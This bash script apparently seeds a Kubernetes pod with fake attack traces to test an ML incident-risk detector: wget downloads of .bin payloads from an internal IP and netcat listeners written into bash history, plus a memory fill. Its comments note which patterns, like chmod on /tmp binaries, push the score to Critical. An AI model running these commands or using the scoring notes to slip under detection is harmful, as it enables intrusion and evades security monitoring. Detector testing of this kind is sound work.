#!/bin/bash
# plant_artifacts_medium.sh <pod> <namespace> [elf-ignored]
# Plants mid-severity artifacts INSIDE the pod via kubectl exec.
# Expected report output: ~75/100 (High)
#
# Score breakdown (incident_risk = min(100, top + 3×n_critical + 1.5×n_high)):
#   wget .../agent.bin  → model ~0.67 → threat 67 → High
#   nc -lvp ...         → model ~0.64 → threat 64 → High
#   5 High, 0 Critical  → min(100, 67 + 0 + 7.5) = 74.5 ≈ 75
#
# NOTE: chmod +x /tmp/... is intentionally excluded — the ML command model
# scores it 0.89 (Critical) because that pattern is a known dropper signature.
# No malicious ELF binary. No real network connections.
# ─────────────────────────────────────────────────────────────────────────────

POD=${1:-webserver}
NAMESPACE=${2:-default}

echo "[demo] Planting mid-severity artifacts into pod $POD (ns: $NAMESPACE)..."

# ── 1. Clean any ELF binaries left over from previous attack runs ────────────
kubectl exec -n "$NAMESPACE" "$POD" -- sh -c '
rm -f /tmp/.x /tmp/.hidden /tmp/agent.bin /tmp/update.sh /tmp/*.elf 2>/dev/null
echo "[demo] /tmp: cleaned previous artifacts"
'

# ── 2. Write suspicious commands into the pod bash history ───────────────────
# wget to /tmp/.bin files scores ~67 High by the ML model (empirically measured).
# nc -lvp scores ~64 High. Neither hits the Critical threshold (>=85).
# NO chmod commands — ML model scores chmod+/tmp/*.bin at 0.89 (Critical).
kubectl exec -n "$NAMESPACE" "$POD" -- sh -c '
echo "wget http://10.10.10.5/agent.bin -O /tmp/agent.bin"    >> /root/.bash_history
echo "wget http://10.10.10.5/scanner.bin -O /tmp/scanner.bin" >> /root/.bash_history
echo "wget http://10.10.10.5/client.bin -O /tmp/client.bin"   >> /root/.bash_history
echo "nc -lvp 9001"                                           >> /root/.bash_history
echo "nc -lvp 4000"                                           >> /root/.bash_history
echo "[demo] bash_history: 5 entries written inside pod"
'

# ── 3. Memory fill INSIDE the pod to push watcher risk score over threshold ──
kubectl exec -n "$NAMESPACE" "$POD" -- sh -c '
python3 -c "
import time
buf = bytearray(150 * 1024 * 1024)
print('"'"'[demo] 150 MB memory fill active — watcher should trigger in ~30s'"'"', flush=True)
time.sleep(600)
" &
echo "[demo] Memory filler PID=$! started inside pod"
'

echo ""
echo "[demo] All artifacts planted inside pod $POD"
echo "[demo] Expected score: ~75/100 (High)"
echo "[demo] Watcher polls every 3s — checkpoint should fire within ~30s"
